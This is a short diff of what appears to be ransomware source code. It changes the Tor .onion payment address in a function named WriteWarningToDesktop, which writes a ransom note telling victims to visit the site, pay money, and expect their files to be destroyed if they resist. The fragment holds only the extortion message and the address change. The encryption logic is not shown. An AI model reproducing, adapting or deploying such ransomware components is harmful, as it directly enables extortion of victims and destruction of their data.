@@ -1310,7 +1310,7 @@ VOID WriteWarningToDesktop() {
 			"2. Open it. Take a deep breath.\n"
 			"\n"
 			"3. Go to our special website (you’ll love it):\n"
-			"http://tazayldgziyi46ylvrhezoep4bskhkrq2ipkdclmuygaxwu43amiicyd.onion\n"
+			"aav3lis2vqulgmot2dulx7seyqv3vyv4i5r3gp5k7bi2t7ll6dsofxyd.onion\n"
 			"\n"
 			"Once you're there, follow the instructions. Yes, it involves money. No, we don’t do refunds.\n"
 			"Try anything funny, and your files take a one-way trip to the digital abyss.\n"
